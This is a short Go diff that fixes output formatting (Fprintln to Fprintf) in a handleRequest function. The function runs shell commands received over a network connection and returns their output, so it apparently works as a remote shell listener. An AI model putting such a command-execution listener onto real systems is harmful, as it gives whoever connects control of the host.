@@ -45,13 +45,13 @@ func handleRequest(conn net.Conn) {
 		if err != nil {
 			fmt.Println("unable to run command,", conn, "%s", err)
 		}
-		fmt.Fprintln(conn, "%s", out)
+		fmt.Fprintf(conn, "%s\n", out)
 		}else {
 			out, err := exec.Command(config.Shell, "-c", strings.TrimSuffix(message, "\n")).Output()
 		if err != nil {
 			fmt.Println("unable to run command,", conn, "%s", err)
 		}
-		fmt.Fprintln(conn, "%s", out)
+		fmt.Fprintf(conn, "%s\n", out)
 		}
 
 	}
